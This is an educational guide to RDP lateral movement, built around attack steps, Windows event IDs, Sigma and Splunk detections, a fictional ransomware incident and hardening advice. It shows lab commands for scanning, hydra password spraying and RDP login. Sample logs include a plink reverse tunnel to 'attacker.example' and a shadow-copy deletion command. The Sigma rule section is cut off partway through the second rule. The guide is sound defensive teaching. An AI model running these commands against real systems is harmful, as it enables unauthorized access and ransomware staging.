Remote Desktop Protocol (RDP)

RDP is a built-in Windows tool. It lets one computer show and control the screen of another computer over the network. Attackers love it: if they steal a valid username and password, they can log in, see a full desktop, and work on the target computer as if they were sitting in front of it.

Written for beginners, SOC analysts, and detection engineers. Every example here is for learning and defense only. This guide shows the attack steps, the logs the attack leaves behind, and how to catch it.

Red Team Perspective

How attackers think about RDP — and why it is one of the most used ways to move inside a network.

This section explains the attacker's view. Knowing how attackers work is the first step to stopping them. Everything here is public knowledge, written for defenders and students.

Ethics first: You must never try these actions against computers you do not own or do not have written permission to test. Breaking into other people's systems is a crime in almost every country. Red teams work under strict rules and written approval.

What is RDP, in simple words?

RDP (Remote Desktop Protocol) is a feature that ships with Windows. An administrator can sit at home and control an office computer as if they were there: they see the desktop, move the mouse, and type. All of this travels over the network, usually on TCP port 3389. Modern Windows also opens a UDP 3389 channel to make the session feel smoother. Because it is built into Windows, it is everywhere — laptops, servers, and cloud virtual machines (VMs). A VM is a software computer running inside a real one.

Why do attackers use it?

  • It looks normal. Administrators use RDP every day. An attacker's RDP session blends in with normal work. This is called "living off the land" — using tools that are already trusted.
  • Full control with one password. No exploit is needed. A stolen username and password is often enough.
  • Strong follow-up options. From an RDP session, the attacker can copy files, run tools, and dump passwords from memory on that machine.
  • It spreads fast. Once they hold admin credentials, they can RDP from computer to computer across the whole company.

When is it used in an attack?

RDP is a Lateral Movement technique. That means it usually comes after the first entry. A typical order of steps looks like this:

1. Get in (phishing, VPN, exposed RDP)→ 2. Steal credentials→ 3. RDP to other computers→ 4. Find data, stage ransomware→ 5. Impact

Sometimes RDP is even the first step: if a company leaves RDP open to the internet with weak passwords, attackers can start there directly. This happened in many famous ransomware cases.

What does an attacker need?

  • Network access to port 3389 on the target. Either from the internet, or from a computer already inside the network.
  • Valid credentials — a username and password. Attackers get them by guessing weak passwords, buying stolen password lists, or stealing them from memory on another computer.
  • RDP enabled on the target. Most Windows servers and many workstations have it on by default.
  • A way past NLA. NLA (Network Level Authentication) asks for the password before any desktop is built. With NLA, the attacker still needs valid credentials — there is no free entry. Without NLA, very old RDP bugs (like BlueKeep, CVE-2019-0708) can be reached before any login.
  • Any RDP client. Windows has one built in (mstsc.exe). There are also free clients like xfreerdp on Linux.

How does it look in practice?

First, the attacker looks for open RDP ports. Then they try passwords. Tools used for the "guess passwords" part include hydra, ncrack, and crowbar. These are legal testing tools when used on your own lab systems. The newer tool netexec (nxc) can also test passwords and show RDP security settings. Here is what that stage looks like on a Linux attack box in a lab:

bash
# Step 1: find computers with RDP open (own lab network only)
nmap -Pn -sV -p 3389 10.10.20.0/24

# Step 2: test one weak password against a list of usernames
hydra -L users.txt -p 'Spring2024!' rdp://10.10.20.24

# Step 3: confirm which hosts accept the login (lab only)
nxc rdp 10.10.20.24 -u users.txt -p 'Spring2024!'

# Step 4: log in with a normal RDP client once a password works
xfreerdp /u:svc_helpdesk /p:'Spring2024!' /v:10.10.20.24 /dynamic-resolution

From inside the RDP session, the attacker works like a normal user with bad plans: they open PowerShell, copy tools over, and try to read saved passwords from the Windows logon process memory (lsass.exe). Tools such as mimikatz can do this on an unpatched, unprotected machine. With a domain admin password in hand, they simply open a new RDP window to the next server. No malware needed at any point — which is exactly why defenders must watch the logons, not only the malware.

Red team note: Real RDP activity is loud for defenders. Every failed guess writes a 4625 event, every success writes a 4624 with Logon Type 10, every connection attempt shows in the RemoteConnectionManager log (1149), and every session appears in the TerminalServices logs. Good attackers go slowly and use few attempts. Bad attackers spray thousands of guesses in minutes — those are the easiest to catch.

Blue Team / SOC Perspective

What RDP abuse looks like to defenders, where to look, and why it matters.

The SOC (Security Operations Center) is the team that watches alerts and logs all day. For this section, think like a defender: the attacker is already trying to log in. Our job is to see it early and react fast.

Why RDP matters to defenders

RDP is both a needed tool and a big risk. Companies need it for remote administration, so you cannot simply turn it off everywhere. That is why it is a favorite path for ransomware groups: they buy or steal passwords, log in over RDP, and walk from server to server until they reach the data. If you can see every RDP login and know which ones are normal, you can stop most attacks at this stage — before data is stolen or encrypted.

The footprints RDP leaves

Windows writes clear records for RDP activity. The most important ones:

Log sourceEvent IDWhat it recordsWhy you care
Security log4624Successful logon. Field Logon Type 10 = RemoteInteractive (the Windows name for an RDP logon).Who logged in where, and from which source computer (IP).
Security log4625Failed logon.Many failures from one source = password guessing.
Security log4778 / 4779Session reconnected / disconnected.Shows RDP session reuse, including from odd source IPs.
TerminalServices-RemoteConnectionManager1149Incoming RDP connection accepted (user authentication succeeded).Early record of every RDP attempt with the source IP, even before the full logon.
TerminalServices-LocalSessionManager21 / 22 / 23 / 24 / 25Session logon, shell start, logoff, disconnect, reconnect.Reliable record of RDP sessions with the source IP, even when other logs are missing.
Sysmon3Network connection.Shows direct traffic to port 3389, including tunnels.
Sysmon10Process access (e.g. reading lsass.exe).Attackers dumping passwords from memory right after an RDP login.
Sysmon13Registry change (Terminal Server keys).RDP switched on remotely, moved to another port, or made weaker.
Security log1102Security log cleared.Attackers hiding their tracks at the end.

Where to look first

  • Central log storage (SIEM). Collect the Security log, TerminalServices-LocalSessionManager, and Sysmon from all Windows computers into one place, such as Splunk or Elastic. A SIEM is a tool that stores and searches logs from many machines.
  • Baseline first. Learn what normal RDP looks like: which jump servers (official admin entry points) are used, which accounts, at what hours.
  • Watch the source IP. An RDP login that does not come from a jump server or VPN range is a strong signal.
  • Count the failures. Bursts of 4625 events with Logon Type 10 are password guessing in progress.
  • Follow the chain. One RDP login followed by password dumping followed by more RDP logins is a classic lateral movement story.
  • Watch the client side too. A new .rdp file (saved connection settings) in a user's Documents folder, or mstsc.exe starting on a machine that never uses it, often shows an attacker preparing the next hop.

How it fits into the attack chain

Initial Access→ Credential Access→ Lateral Movement (RDP)→ Collection→ Impact

Seeing RDP alone is not an emergency — admins use it daily. Seeing unusual RDP (strange source, strange account, strange hour, or right after many failures) is the alert. That is the mindset: trust the pattern, not the single event.

First response tip: When you confirm malicious RDP, act in this order: (1) disable the account used, (2) block the source IP at the firewall, (3) isolate the target computer, (4) reset passwords the account may have touched, (5) search the SIEM for every 4624 Type 10 from that source in the last 30 days.

Detection Engineering Deep Dive

The complete work of a detection engineer for this technique: rules, mapping, intel, logs, and queries.

A detection engineer turns threats into working alerts. This section walks through the full job: mapping the technique to rules and regulations, studying the threat actors who use it, ranking the threats, reading real log samples, and writing Sigma rules plus Splunk queries. This is the reference part of the guide — take your time here.

Regulation Mapping

Rules like GDPR or PCI DSS do not say "detect RDP". They say "protect data" and "monitor access". RDP abuse breaks those requirements, so auditors will ask how you detect and control it. Use this table when someone asks why this detection work is required:

GDPRArt. 32 / Art. 33Protect personal data with suitable technical measures; report breaches within 72 hours.Attackers reaching personal data over RDP show a missing control (MFA, monitoring). Fast breach reporting needs RDP telemetry that is already collected.
HIPAA§164.312(a)(1) / §164.312(b)Access control; audit controls for ePHI (health data).Only allowed people may reach health records. RDP logons (4624/4625 plus TerminalServices logs) are exactly the audit trail examiners expect.
ISO 27001:2022A.8.2 / A.8.5 / A.8.16Privileged access rights; secure authentication; monitoring activities.RDP with admin accounts must be restricted, protected with strong authentication, and watched for abnormal use. The Sigma rules below are direct proof of A.8.16.

Threat Intelligence

Threat intelligence (often shortened to CTI) means learning about attackers before they hit you, and using that knowledge to build better defenses. For RDP, the intelligence picture is very clear: this technique is used constantly by ransomware groups and state-sponsored spies. Here is how a detection engineer works with it, step by step:

  • Collect. Read MITRE ATT&CK pages for this technique, CISA advisories, vendor reports (Microsoft, Sophos, Trend Micro, Palo Alto), and free feeds such as MISP (a free system for sharing threat data) or AlienVault OTX. Save reports that mention RDP abuse.
  • Analyze. For each report, note: which actor, which accounts they abused, which tools, which ports, and which logs they would create. Tag everything with attack.t1021.001 so it is searchable.
  • Apply. Turn findings into three things: new detection rules (like the Sigma rules below), hunting hypotheses (questions to search in your logs), and purple-team tests (safe, planned tests to prove your detections work).

Hunting hypotheses for your environment

  • "Are there RDP logons (Type 10) that do not come from our official jump servers?"
  • "Did any account get more than 10 failed RDP attempts (4625) in 10 minutes, followed by a success?"
  • "Did any user account create RDP sessions on more than 5 different computers in one day?"

Logs & Patterns

Now the practical part: for each threat from the ranking, here are the logs to use, a realistic sample of what the log entry looks like, and the pattern to search for. All samples use fake names and IP addresses in reserved test ranges (like 203.0.113.x, 198.51.100.x, and 10.x.x.x).

1. Ransomware staging over RDP

Logs: Windows Security log, Sysmon, EDR. Pattern: an interactive RDP logon (Type 10) by an admin account is followed within minutes by tool launches, backup service stops, or shadow-copy deletion.

xml — Windows Security 4624 (RDP logon)
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"/>
    <EventID>4624</EventID>
    <TimeCreated SystemTime="2026-09-12T02:14:09.337811200Z"/>
  </System>
  <EventData>
    <Data Name="SubjectUserName">FS01$</Data>
    <Data Name="TargetUserName">admin_mike</Data>
    <Data Name="LogonType">10</Data>
    <Data Name="IpAddress">10.1.20.24</Data>
    <Data Name="WorkstationName">SALES-PC01</Data>
    <Data Name="ProcessName">C:\Windows\System32\winlogon.exe</Data>
  </EventData>
</Event>
What to look for:
  • LogonType = 10 and a time outside the normal admin window (for example 02:00).
  • Same session followed by Sysmon Event ID 1 running vssadmin delete shadows or stopping backup services.
  • The account used has not logged in this way before — compare with the last 30 days.

2. RDP tunneling to bypass firewalls

Logs: Sysmon (process creation + network), firewall logs. Pattern: a tunneling tool process on an internal host opens an outbound connection, and short after, RDP traffic arrives from that same internal host to other machines — the tunnel acts like a bridge.

xml — Sysmon Event ID 1 (tunnel tool started)
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-09-12T02:31:44.118022300Z"/>
  </System>
  <EventData>
    <Data Name="Image">C:\Users\svc_helpdesk\AppData\Local\Temp\plink.exe</Data>
    <Data Name="CommandLine">plink.exe -ssh -R 3389:10.1.20.5:3389 user@attacker.example -pw MyStr0ngPass!</Data>
    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
    <Data Name="User">CORP\svc_helpdesk</Data>
  </EventData>
</Event>
What to look for:
  • Known tunnel tool names (plink.exe, chisel.exe, ngrok.exe, iox.exe) or any binary in a Temp folder with a -R port-forward flag.
  • Sysmon Event ID 3 from the same host to an outside IP on port 22 or 443 right before internal 3389 flows.
  • netsh interface portproxy rules — attackers also use this built-in way to forward ports.

3. Credential dumping after RDP login

Logs: Sysmon Event ID 10 (process access), EDR. Pattern: minutes after a Type 10 logon, a process opens lsass.exe — the process that holds password material — and asks for full access.

xml — Sysmon Event ID 10 (LSASS access)
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>10</EventID>
    <TimeCreated SystemTime="2026-09-12T02:18:52.773164100Z"/>
  </System>
  <EventData>
    <Data Name="SourceImage">C:\Users\svc_helpdesk\Downloads\mimi.exe</Data>
    <Data Name="TargetImage">C:\Windows\system32\lsass.exe</Data>
    <Data Name="GrantedAccess">0x1010</Data>
    <Data Name="SourceUser">CORP\svc_helpdesk</Data>
  </EventData>
</Event>
What to look for:
  • Any non-system process touching lsass.exe with GrantedAccess values like 0x1010 or 0x143a.
  • Correlate with the RDP logon: dumping within one hour of a Type 10 logon is a red flag.

4. Password guessing / spraying on exposed RDP

Logs: Windows Security 4625, firewall logs. Pattern: bursts of failed logons with Logon Type 10 from the same source, often against one or many usernames, sometimes followed by a success. This hits internet-facing RDP on the company edge and on cloud VMs alike.

xml — Windows Security 4625 (failed RDP logon)
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4625</EventID>
    <TimeCreated SystemTime="2026-09-12T01:57:21.104552100Z"/>
  </System>
  <EventData>
    <Data Name="TargetUserName">administrator</Data>
    <Data Name="LogonType">10</Data>
    <Data Name="IpAddress">203.0.113.7</Data>
    <Data Name="Status">0xc000006a</Data>
    <Data Name="SubStatus">0xc000006a</Data>
    <Data Name="WorkstationName">WIN-ATTACKER</Data>
  </EventData>
</Event>
What to look for:
  • Status code 0xc000006a = wrong password; 0xc0000072 = account disabled; 0xc0000234 = account locked.
  • More than ~10 failures from one source IP in 10 minutes on any host with RDP.
  • A 4624 Type 10 from the same IP right after failures = the guess worked. Treat as an incident.
  • Same burst on cloud Windows VMs — they are found within minutes of creation, so collect their logs too.

5. Session hijack with tscon

Logs: Sysmon Event ID 1, PowerShell/Security 4688. Pattern: the built-in tscon.exe tool is called with a /dest: option while the caller has SYSTEM rights — this redirects another user's live session to the attacker's screen.

xml — Sysmon Event ID 1 (tscon session redirect)
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-09-12T02:22:10.521908400Z"/>
  </System>
  <EventData>
    <Data Name="Image">C:\Windows\System32\tscon.exe</Data>
    <Data Name="CommandLine">tscon 3 /dest:rdp-tcp#4</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
  </EventData>
</Event>
What to look for:
  • Any tscon.exe launch with /dest: in the command line — normal users almost never use it.
  • Especially when the parent process is a service host (attacker used a service to get SYSTEM).

6. Mass lateral RDP fan-out

Logs: TerminalServices-LocalSessionManager 21, Security 4624. Pattern: the same source computer (or account) shows RDP session starts on many different machines within a short window.

xml — TerminalServices-LocalSessionManager EID 21 (session logon)
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-TerminalServices-LocalSessionManager"/>
    <EventID>21</EventID>
    <TimeCreated SystemTime="2026-09-12T02:40:03.994710100Z"/>
  </System>
  <EventData>
    <Data Name="User">CORP\admin_mike</Data>
    <Data Name="SessionID">4</Data>
    <Data Name="Address">10.1.20.24</Data>
  </EventData>
</Event>
What to look for:
  • Count distinct destination hosts per source IP per day. Normal admins hit 1–3 jump targets; a fan-out hits dozens.
  • Event 25 (reconnect) from a new source IP for an old session is another hijack-style signal.

7. Log clearing after RDP sessions

Logs: Windows Security 1102, plus the TerminalServices logs on the same host. Pattern: the Security log is cleared shortly after RDP session activity by the same account — the attacker is removing the story of where they logged in.

xml — Windows Security 1102 (audit log cleared)
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Eventlog" Guid="{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}"/>
    <EventID>1102</EventID>
    <TimeCreated SystemTime="2026-09-12T02:52:07.442918300Z"/>
  </System>
  <EventData>
    <Data Name="SubjectUserSid">S-1-5-21-1004336348-1177238915-682003330-512</Data>
    <Data Name="SubjectUserName">admin_mike</Data>
    <Data Name="SubjectDomainName">CORP</Data>
    <Data Name="SubjectLogonId">0x12A4B7</Data>
  </EventData>
</Event>
What to look for:
  • Any 1102 outside an approved maintenance window — treat it as a Critical alert.
  • The account in SubjectUserName holds admin rights (SID ending in -512 = domain admins here) and had a Type 10 logon minutes before.
  • A host that stops sending logs at all can mean the same thing — alert when a forwarder goes quiet.

8. Misconfigured or legacy RDP

Logs: Sysmon Event ID 13 (registry), Microsoft-Windows-TerminalServices-RemoteConnectionManager admin log. Pattern: someone (or some attacker) turns RDP on remotely or weakens its security settings.

xml — Sysmon Event ID 13 (RDP enabled via registry)
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>13</EventID>
    <TimeCreated SystemTime="2026-09-12T02:16:38.220114500Z"/>
  </System>
  <EventData>
    <Data Name="EventType">SetValue</Data>
    <Data Name="TargetObject">HKLM\System\CurrentControlSet\Control\Terminal Server\fDenyTSConnections</Data>
    <Data Name="Details">DWORD (0x00000000)</Data>
    <Data Name="Image">C:\Windows\System32\reg.exe</Data>
  </EventData>
</Event>
What to look for:
  • fDenyTSConnections changing to 0 (RDP turned ON) on workstations — most workstations never need inbound RDP.
  • Changes to PortNumber under RDP-Tcp (attackers sometimes move RDP to another port to hide).
  • Settings that disable NLA under Authentication Level.

Sigma Detection Rules

Sigma is a free, open format for writing detection rules once and running them in any SIEM. Each rule below matches one threat from the ranking. Under every rule you find the matching Splunk SPL query. SPL (Search Processing Language) is the search language used in Splunk. Adjust the index names to your own environment.

Rule 1 — RDP logon from an unusual source host

Catches a Type 10 logon that does not come from an official jump server. This is the core "strange login" rule for RDP.

yaml — sigma
title: RDP Logon from Unusual Source Host
id: 7e2b1c04-9a3d-4f61-b8c8-2f5e0a9d4c11
status: stable
description: >
  Detects an interactive RDP logon (Logon Type 10) from a source IP that is not
  an approved jump server. Attackers use RDP to move between Windows machines
  after stealing valid credentials.
references:
  - https://attack.mitre.org/techniques/T1021/001/
author: Detection Engineering Team
date: 2026/09/29
tags:
  - attack.lateral_movement
  - attack.t1021.001
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 10
  filter_known_jump:
    IpAddress:
      - '10.0.20.11'
      - '10.0.20.12'
  condition: selection and not filter_known_jump
falsepositives:
  - Administrators connecting from new workstations during planned maintenance
  - New jump servers that are not on the allow list yet
level: medium
spl — splunk
index=wineventlog source="WinEventLog:Security" EventCode=4624 Logon_Type=10
| search NOT IpAddress IN ("10.0.20.11", "10.0.20.12")
| stats count AS logons, values(user) AS users BY IpAddress, dest
| sort - logons

Rule 2 — RDP password guessing burst

Catches many failed RDP logons from one source in a short window. This is the early-warning rule for attacks like SamSam.

yaml — sigma
title: RDP Password Guessing Burst
id: b3f8a2d1-6c47-4e59-8a2b-1d9e3f7c5a02
status: stable

Real-World Scenario

"City of Riverport" — a realistic incident built on the SamSam playbook and real 2018 ransomware patterns.

Public incidents show this technique in action again and again. The story below is a realistic composite based on the real SamSam ransomware campaign (2016–2018), which attacked exposed RDP servers at hospitals, cities, and universities — including the City of Atlanta in March 2018. Names and numbers here are fictional, but every step follows the documented pattern.

The attack chain

1. Exposed RDP found→ 2. Password sprayed→ 3. RDP sessions spread→ 4. Backups deleted→ 5. Ransomware runs

Timeline

DAY 1 — 02:10
Scanning starts

An automated scan hits the city's network range from a hosting provider. It finds an old utility server with RDP open to the internet on port 3389. The server belongs to a forgotten project and was never in the asset list. You cannot defend what you do not know exists — this is the first lesson.

DAY 3 — 01:40
Password spraying

Failed logon events (4625, Logon Type 10) appear on the utility server — about 8 per hour, spread out to stay under a password lockout policy of 5 tries per hour. Nobody is watching this server's logs; they are not forwarded to the SIEM. The attacks continue for two weeks.

DAY 17 — 03:22
A weak password falls

The local account cityadmin used the password Riverport2023!. It meets the old complexity rules, but it follows the pattern CityName + Year, which spraying tools try first. A 4624 Type 10 event records the success. The attacker now has a desktop on the internal network.

DAY 18
Quiet recon from the RDP session

Working inside the RDP window, the attacker maps the network with normal Windows commands (net view, nltest), finds a file server and the domain controller, and reads saved passwords from the browser. Slow, patient, and almost silent — the few logs produced go nowhere.

DAY 20 — 22:05
Credential theft and fan-out

From the RDP session the attacker runs a credential-dumping tool against lsass.exe and captures a domain admin password. RDP sessions open on 12 more servers the same night — a fan-out pattern that no rule was watching.

DAY 21 — 01:55
Backups go first

On each server the attacker stops backup services and deletes shadow copies (vssadmin delete shadows /all). An EDR agent on one server raises a low-priority alert. It sits in a queue for 11 hours — the single most expensive mistake of the incident.

DAY 21 — 03:10
Encryption and ransom note

The ransomware runs. 412 servers encrypt in under 3 hours. Payment portals, permit systems, and email archives go down. A note demands $650,000.

DAY 21 — 04:00
Detection and declaration

The SOC sees thousands of file-change events plus failed logons from servers acting strangely, and declares a major incident at 04:00. The on-call analyst pulls the 4624 Type 10 history for cityadmin and finds the whole story in 40 minutes.

Containment and recovery

Containment (first 24 hours)

  • 02:00 — Attacker IP blocked at the firewall; cityadmin disabled; all admin passwords reset.
  • 03:30 — Remaining servers isolated at the switch level to stop encryption spread.
  • 06:00 — Domain controller preserved for forensics; new temporary domain built for critical services.
  • 12:00 — War room established: SOC lead, infrastructure, legal, communications, and an outside forensics firm.

Recovery (days 2–6)

  • Backups of 3 core systems survived on an isolated storage tier — everything else was rebuilt.
  • Priority order: payment systems, 911 support systems, email, then everything else.
  • All rebuilt servers got MFA-protected RDP behind VPN, centralized logging, and EDR before returning to service.
  • The ransom was not paid. Total recovery cost: about $1.9M, mostly staff time and outside help.

Impact and consequences

Beyond the money, the city lost 911 call-center redundancy for 5 days, could not process payments for 2 weeks, and had to notify residents about delayed services. Local news covered the outage daily. The state auditor opened a review of the city's IT controls, and the after-action report became public record. The CIO resigned within three months. Indirect damage — lost trust and months of slower, more careful work — lasted far longer than the outage itself.

Lessons learned

What failedFix applied after the incident
RDP open to the internet on an unknown serverAsset inventory + external attack-surface scans every month; zero internet-facing RDP, all remote admin through VPN with MFA.
Logs not centralizedAll Windows logs (Security + TerminalServices) forwarded to the SIEM; alerting on Type 10 logons from non-VPN sources.
Weak, guessable password on an admin accountMFA on all admin accounts, 16+ character passphrases, and lockout policy tuned with monitoring.
EDR alert on backup tampering sat in a queueBackup-deletion events routed to a Critical alert with 15-minute response target.
Backups reachable from the domain admin accountImmutable, offline backup copies that no domain account can modify or delete.
Communication lesson: The city held a short update call every 4 hours during the incident — for executives, staff, and the public in simple words. Clear, boring, repeated updates kept panic low and let engineers focus on recovery.

Mitigation & Defense

Layered, practical defenses — from big enterprise to your home network.

No single control stops RDP abuse. The goal is layers: make RDP hard to reach, hard to log into, easy to watch, and quick to cut off. Each layer below buys you time; attackers give up when every step costs them effort.

Priority actions for an enterprise

ActionStops whatEffort
Never expose RDP (port 3389) to the internet. Access it only through VPN or a zero-trust broker.Scanning, password spraying, direct exploitsLow
Require MFA (multi-factor authentication) on every RDP path, including jump servers.Stolen passwords alone being enoughMedium
Enable NLA (Network Level Authentication) everywhere — the attacker must prove identity before a session opens.Pre-auth exploits, anonymous attacksLow
Use LAPS for local admin passwords (a Microsoft tool that makes every computer's admin password unique and rotated).One stolen password opening many machinesLow
Restrict which accounts may log in over RDP, and use dedicated jump servers (PAW) for admin work.Admin credentials spreading everywhereMedium
Segment the network: workstations cannot reach 3389 on servers; only jump servers can.Mass lateral fan-out after one compromiseHigh
Patch and verify: BlueKeep-class RDP bugs (CVE-2019-0708 and friends) hit unpatched, unauthenticated sessions.Worm-style pre-auth exploitationLow
Forward Security, TerminalServices, and Sysmon logs to a SIEM; deploy the Sigma rules from section 4.Silent lateral movement and hijacksMedium
Tune account lockout + alerts: lock after smart thresholds, alert on every Type 10 from a non-VPN source.Spraying at scaleLow
Run periodic purple-team tests of your RDP detections (planned, controlled, approved).Rules that silently stopped workingMedium

Example: disable inbound RDP on workstations with Group Policy

cmd
:: Check current RDP status on a machine
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections

:: 1 = RDP disabled (recommended for workstations), 0 = enabled
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f

:: Require NLA (do not allow weaker clients)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f

Simple steps for a home environment

  • Do not open port 3389 on your router. Port forwarding RDP to the internet is the single most common home mistake.
  • Use a tunnel tool instead. Free options like Tailscale or WireGuard give you remote access without any open port.
  • Turn RDP off if you do not use it. Settings → System → Remote Desktop → Off.
  • Use a long, unique password for your Windows account — 4 random words beat Home2024!.
  • Keep Windows updated so old RDP bugs (like BlueKeep) cannot touch you.
  • Check who is connected. If your machine is shared, look at Task Manager → Users for sessions you do not know.

How the layers work together

VPN / broker only→ MFA on top→ Least-privilege accounts→ Segmentation→ Full logging + alerts→ Fast response playbook

If one layer fails, the next still holds. An attacker now needs: a stolen password and your second factor and a permitted account and network access — and they still show up in the logs. That is the realistic win condition for defenders.

Common Mistakes & Best Practices

Day-to-day advice for SOC analysts and detection engineers who watch RDP.

Mistakes that hurt (and how to fix them)

Common mistakeWhy it hurtsDo this instead
Watching only successful logons (4624)Password guessing is invisible until it succeeds.Alert on 4625 bursts with Logon Type 10, and on "failures then success" from one source.
Not collecting TerminalServices-LSM logs (21/24/25)You lose the most reliable RDP source-IP record.Add this log to every Windows forwarder policy; it is cheap and high value.
Trusting the source IP field blindlyNAT (many users behind one IP) and VPNs blur the truth.Combine IP with account, hostname, and time-of-day; baseline per environment.
Fixed thresholds like "alert at 5 failures"Either floods you (fatigue) or misses slow spraying.Tune per asset type: servers stricter, workstations looser; review quarterly.
Ignoring cloud Windows VMsAttackers move to whichever box is forgotten.Include cloud VMs in log collection and RDP hardening. They are scanned within minutes of going live.
Only watching port 3389 inboundTunnels make RDP arrive from an internal host instead.Detect tunnel tools and netsh portproxy rules; watch outbound 22/443 from servers.
Never testing detectionsRules break silently after log format or index changes.Purple-team RDP quarterly: one planned test per rule, record the result.
Not alerting on log clearing (1102)Attackers delete their own story at the end.Any 1102 outside approved windows is a Critical alert. Always.
Treating every RDP alert as urgentAnalysts learn to ignore the rule.Risk-score alerts: source not a jump server + rare account + odd hour = high; otherwise informational.
Forgetting the human account storyA new admin on a new laptop looks identical to an attacker.Keep an allow-list of accounts allowed to RDP, updated when people change roles.

Best practices checklist

  • Baseline first: know your normal jump servers, accounts, and hours before writing strict rules.
  • Correlate, do not count alone: the "failures then success" pattern beats any single event.
  • Protect the logs: forward to the SIEM in near real time and alert when a host stops sending.
  • Track configuration drift: any new host with RDP enabled is a ticket, not a surprise.
  • Rehearse the playbook: disable account, block IP, isolate host, reset credentials — muscle memory beats panic.
  • Document false positives: every suppression rule needs an owner and an expiry date.
  • Review your exposure monthly: external scans for open 3389 take minutes and prevent years of pain.
